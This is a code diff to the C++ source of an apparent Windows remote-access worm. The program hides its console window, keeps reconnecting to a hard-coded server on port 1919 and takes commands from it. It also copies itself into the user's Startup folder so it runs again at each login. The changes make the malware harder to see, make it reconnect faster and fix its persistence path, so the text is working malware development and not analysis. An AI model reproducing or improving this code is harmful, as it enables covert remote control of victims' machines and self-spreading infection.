@@ -10,7 +10,8 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
-#define MAX 8192
+#include <filesystem>
+#define MAX 65536
 
 class client{
 private:
@@ -31,8 +32,9 @@ private:
     char p_w_d[MAX];
 public:
     client(): port_number(1919) {
+        //FreeConsole();
         AllocConsole();
-        window = FindWindowA("test", NULL);
+        window = FindWindowA("ConsoleWindowClass", NULL);
         ShowWindow(window, 0);
 
         send_buf[MAX] = {};
@@ -55,11 +57,11 @@ void client::virii() {
 
     inet_pton(dst_addr.sin_family, server_ip_addr, &dst_addr.sin_addr.s_addr);
 
-    dst_socket = socket(AF_INET, SOCK_STREAM, 0);
-
     while (1) {
+        dst_socket = socket(AF_INET, SOCK_STREAM, 0);
+
         if (connect(dst_socket, (struct sockaddr *) &dst_addr, sizeof(dst_addr))) {
-            std::this_thread::sleep_for(std::chrono::minutes(3));
+            std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }
 
@@ -67,10 +69,9 @@ void client::virii() {
             recv(dst_socket, recv_buf, sizeof(recv_buf), 0);
             recv_buf[strcspn(recv_buf, "\r\n")] = 0;
 
-            if (!strcmp(recv_buf, "exit")) {
-                break;
-            }
-            else if (!strncmp("cd ", recv_buf, 3)) {
+            if (!strcmp(recv_buf, "!q")) break;
+            
+            if (!strncmp("cd", recv_buf, 2)) {
                 for (size_t i = 0; i < strlen(recv_buf); i++) {
                     p_w_d[i] = recv_buf[i+3];
                 }
@@ -122,6 +123,9 @@ int main(int argc, char **argv) {
     if (str.find(".exe") == std::string::npos) {
         str += ".exe";
     }
+    std::filesystem::path path = std::filesystem::current_path();
+    std::string path_string{path.u8string() + "\\"};
+    str.erase(str.find(path_string));
     std::string startup_directory = "\"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
     std::string dir_place_worm = startup_directory + "\\" + str;
     std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" " + dir_place_worm + "*\" /Y";
